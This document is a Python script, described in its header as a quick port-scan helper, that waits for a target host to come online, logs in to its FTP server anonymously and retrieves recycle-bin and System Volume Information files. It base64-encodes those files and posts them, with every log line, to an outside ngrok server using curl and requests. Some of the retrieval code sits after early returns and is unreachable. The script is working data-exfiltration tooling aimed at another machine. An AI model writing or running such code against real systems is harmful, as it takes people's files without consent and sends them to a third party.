#
# qdportscan.py, by Seb
# A quick&dirty script to wait for the target to go up and enumerate a bunch of ports to see if any are open
#

import sys
import time
import base64
import ftplib
import requests
import subprocess

LOG_SERVER = "https://super-becoming-frog.ngrok-free.app/"

def log(logstr: str, console=True) -> None:
    if logstr is None: logstr = "None"
    if type(logstr) is not str: logstr = str(logstr)
    if console: print(logstr)
    subprocess.Popen( # This is non-blocking. Using this instead of requests because idk if we even have access to requests lmao
        ["curl", "-X", "POST", LOG_SERVER, "-d", logstr], 
        stdout=subprocess.DEVNULL, 
        stderr=subprocess.DEVNULL
    )

def is_target_up(ip: str) -> bool:
    return subprocess.run(["ping", "-n", "1", ip], capture_output=True).returncode == 0 # Cheeky: A nonzero status code means the target wasn't up

def wait_for_target_up(ip: str) -> None:
    # Wait for target to go up by continually pinging it
    print("Waiting for target to go up.", end="")
    wait_start = time.time()
    while not is_target_up(ip):
        print(".", end="")
    wait_end = time.time()
    print(" Target up! Took", wait_end-wait_start, "seconds of waiting.")

def run_cmd(cmd_str, do_print=True) -> None:
    if type(cmd_str) == str:
        cmd = cmd_str.split()
    else:
        cmd = cmd_str

    start_time = time.time()
    cmd_run = subprocess.run(cmd, shell=True, capture_output=True)
    run_time = time.time() - start_time
    
    try: stdout = cmd_run.stdout.decode()
    except: stdout = None

    try: stderr = cmd_run.stderr.decode()
    except: stderr = None

    if do_print:
        log(f"=== `{cmd_str}` output:\n## stdout:\n{stdout}\n## stderr:\n{stderr}\n## runtime:\n{run_time} s\n")

def send_b64_file(ftp: ftplib.FTP, command: str, filename: str = "") -> None:
    if filename == "": filename = command.split()[-1]
    bin_data = bytearray()
    ftp.retrbinary(command, callback=bin_data.extend)
    log(f"b64\t{filename}\t" + base64.b64encode(bin_data).decode(), console=False)

def main() -> None:
    print("Argv:", sys.argv)
    _, ip, outdir = sys.argv

    log("Script up and running, waiting for target IP to come online...", console=False)
    wait_for_target_up(ip)
    log(f"Target is online! IP: {ip}", console=False)
    time.sleep(100)
    log(f"You should really disconnect now", console=False)
    return
    
    # Test the HTTP server
    if False: # Disabled, we are FTP-ing now
        run_cmd(["python", "-m", "pip", "list"])
        run_cmd(["python3", "-m", "pip", "list"])
        run_cmd(["pip", "list"])
        run_cmd(["echo", "%path%"])
        run_cmd(["curl", "-v", f"http://{ip}/"])

    # Test the FTP server
    ftp = ftplib.FTP(ip)
    ftp.login("anonymous", "12341234")
    print("Root listing:")
    ftp.retrlines('LIST')
    print("System Vol Info listing:")
    ftp.cwd("System Volume Information")
    ftp.retrlines('LIST')

    # Some manual files in there too
    send_b64_file(ftp, f"RETR $RECYCLE_BIN/S-1-5-21-4268949009-2474151485-325352119-500/$IUXBIII.txt", "$I_UXBIII.txt")
    send_b64_file(ftp, f"RETR $RECYCLE_BIN/S-1-5-21-4268949009-2474151485-325352119-500/$RUXBIII.txt", "$R_UXBIII.txt")

    ftp.quit()
    return

    # Send over system volume info files as base64
    send_b64_file(ftp, "RETR tracking.log", "tracking.log")
    send_b64_file(ftp, "RETR WPSettings.dat", "WPSettings.dat")

    # List files in recycle bin
    print("Checking recycle bin")
    ftp.cwd("../$RECYCLE.BIN")
    ftp.retrlines("LIST")
    for bindir in ftp.nlst():
        print("## Checking", bindir)
        ftp.cwd(bindir)
        ftp.retrlines("LIST")
        for f in ftp.nlst():
            send_b64_file(ftp, f"RETR {f}", bindir + "_" + f)
        ftp.cwd("..")
    ftp.cwd("..")
    
    # Send over a list of all the targets
    ftp.cwd("targets")
    output_lines = []
    for name, facts in ftp.mlsd():
        line = f"{name} | {facts}"
        output_lines.append(line)
    #log("\n".join(output_lines), console=False)
    requests.post(LOG_SERVER, data="\n".join(output_lines))
    ftp.quit()

if __name__ == "__main__":
    main()
